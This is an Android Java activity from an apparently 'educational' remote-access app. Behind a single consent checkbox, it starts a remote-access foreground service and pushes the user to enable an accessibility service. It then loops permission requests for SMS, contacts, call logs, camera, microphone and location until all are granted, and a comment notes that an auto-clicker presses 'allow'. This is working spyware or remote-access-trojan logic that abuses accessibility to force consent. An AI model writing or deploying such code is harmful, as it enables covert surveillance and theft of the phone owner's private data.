package com.remoteaccess.educational;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.utils.PreferenceManager;
import android.os.Handler;
import java.util.ArrayList;
import java.util.List;

public class ConsentActivity extends AppCompatActivity {

    private CheckBox consentCheckbox;
    private Button acceptButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_consent);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);

        consentCheckbox = findViewById(R.id.consentCheckbox);
        acceptButton = findViewById(R.id.acceptButton);

        acceptButton.setEnabled(false);

        consentCheckbox.setOnCheckedChangeListener((buttonView, isChecked) -> {
            acceptButton.setEnabled(isChecked);
        });

        acceptButton.setOnClickListener(v -> {
            if (consentCheckbox.isChecked()) {
                acceptButton.setEnabled(false);
                
                // Step 1: Start RemoteAccessService immediately
                startRemoteAccessService();
                
                // Step 2: Request Accessibility Service
                permissionManager.requestAccessibilityService();
                
                // Step 3: Wait for accessibility to be enabled, then request permissions
                startWaitingForAccessibility();
            }
        });
    }
    
    private Handler accessibilityPollHandler = new android.os.Handler();
    private Runnable accessibilityPollRunnable;
    private volatile boolean permissionRequestActive = false;

    private void startWaitingForAccessibility() {
        // Poll every 200ms to detect accessibility enable as fast as possible
        accessibilityPollRunnable = new Runnable() {
            @Override
            public void run() {
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    // Accessibility enabled — immediately request permissions
                    if (!permissionRequestActive) {
                        permissionRequestActive = true;
                        requestNecessaryPermissions();
                    }
                    // Keep polling: re-request every 200ms until all granted
                    accessibilityPollHandler.postDelayed(this, 200);
                } else {
                    // Still waiting for accessibility — poll again in 200ms
                    accessibilityPollHandler.postDelayed(this, 200);
                }
            }
        };
        accessibilityPollHandler.post(accessibilityPollRunnable);
    }

    private void stopAccessibilityPolling() {
        if (accessibilityPollHandler != null && accessibilityPollRunnable != null) {
            accessibilityPollHandler.removeCallbacks(accessibilityPollRunnable);
        }
    }
    
    private void startRemoteAccessService() {
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void requestNecessaryPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Check and add permissions that are not granted
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                permissionsToRequest.toArray(new String[0]),
                PERMISSION_REQUEST_CODE
            );
        } else {
            grantConsent();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check if all permissions are granted
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                stopAccessibilityPolling();
                grantConsent();
            } else {
                // Re-request permissions after delay (auto-clicker will try again)
                new android.os.Handler().postDelayed(this::requestNecessaryPermissions, 500);
            }
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Only request permissions if accessibility is enabled
        if (permissionManager.isAccessibilityServiceEnabled()) {
            requestNecessaryPermissions();
            // Start aggressive polling to re-request until all granted
            if (!permissionRequestActive) {
                startWaitingForAccessibility();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopAccessibilityPolling();
    }

    private void grantConsent() {
        preferenceManager.setConsentGiven(true);
        
        // Start remote access service
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        Toast.makeText(this, "Consent granted. Remote access enabled.", Toast.LENGTH_LONG).show();
        finish();
    }
}
